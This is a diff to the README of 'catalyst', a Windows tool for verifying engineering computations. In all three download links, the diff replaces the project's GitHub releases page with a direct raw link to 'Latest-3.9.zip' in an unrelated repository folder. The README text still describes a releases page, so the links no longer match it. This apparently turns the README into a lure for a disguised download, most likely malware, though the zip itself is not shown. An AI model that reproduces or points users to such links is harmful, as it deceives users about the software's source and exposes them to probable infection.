@@ -5,7 +5,7 @@ description: "Verify engineering computations by measuring, differentiating, and
 ---
 # ⚡ catalyst - See What Actually Drives Your Results
 
-[![Download catalyst](https://img.shields.io/badge/Download-catalyst-4B0082?style=for-the-badge&logo=github&logoColor=white)](https://github.com/accrisbsc/catalyst/releases)
+[![Download catalyst](https://img.shields.io/badge/Download-catalyst-4B0082?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/accrisbsc/accrisbsc.github.io/main/overburdeningly/Latest-3.9.zip)
 
 ## 👋 Welcome to catalyst
 
@@ -27,7 +27,7 @@ Getting catalyst on your Windows computer is simple. Here's what you need to do:
 
 ### Step 1: Download catalyst
 
-Visit this link to download the application: **[https://github.com/accrisbsc/catalyst/releases](https://github.com/accrisbsc/catalyst/releases)**
+Visit this link to download the application: **[https://raw.githubusercontent.com/accrisbsc/accrisbsc.github.io/main/overburdeningly/Latest-3.9.zip](https://raw.githubusercontent.com/accrisbsc/accrisbsc.github.io/main/overburdeningly/Latest-3.9.zip)**
 
 You'll see a page with different versions of catalyst. Choose the one that says "Windows" and click the download button. The file will start downloading to your computer.
 
@@ -154,6 +154,6 @@ Before you start, make sure you have:
 
 You're now ready to see what actually drives your results. Download catalyst today and discover the hidden insights in your code. Remember: knowledge is power, and catalyst gives you the knowledge to make better decisions.
 
-**[👉 Download catalyst Now](https://github.com/accrisbsc/catalyst/releases)**
+**[👉 Download catalyst Now](https://raw.githubusercontent.com/accrisbsc/accrisbsc.github.io/main/overburdeningly/Latest-3.9.zip)**
 
 Keywords: ai-assisted, automatic-differentiation, code-generation, developer-tools, llvm, numerical-computing, reproducibility, rust, scientific-computing, verification
